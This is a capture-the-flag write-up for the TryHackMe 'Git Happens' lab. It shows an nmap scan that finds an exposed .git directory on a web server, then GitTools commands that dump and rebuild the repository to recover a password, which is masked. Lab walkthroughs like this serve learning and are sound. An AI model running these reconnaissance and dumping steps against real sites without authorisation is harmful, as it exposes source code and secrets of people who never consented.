---
title: "Git Happens - TryHackMe"
category: "THM"
pubDate: 2020-08-21
description: "Writeup for the Git Happens room"
---
[TryHackMe | Git Happens](https://tryhackme.com/room/githappens)

Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!

Can you find the password to the application?

---

### Setup

```
└──╼ $ nmap -A -T4 10.10.58.41
```

```
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git:
|   10.10.58.41:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

As you can see the nmap scan found a ".git" repertory on the website, let's use some tools to get all the data.

[internetwache/GitTools](https://github.com/internetwache/GitTools)

![](https://i.imgur.com/XXygrPA.png)

```
└──╼ $ ./gitdumper.sh http://10.10.58.41/.git/ .
```

Once the dumper script get all the data let's use the extractor script to have all the source code.

![](https://i.imgur.com/8DyZR2H.png)

```
└──╼ $ ./extractor.sh ~/Desktop/TryHackMe/git-thm/GitTools/Dumper/ .
```

![](https://i.imgur.com/a53y7oc.png)

As you can see the script created some directory, let's see if the password is in there.

### **#1 Find the Super Secret Password**

![](https://i.imgur.com/SzdvdmG.png)

```
Th**_**_*_****_****_******_*******!
```


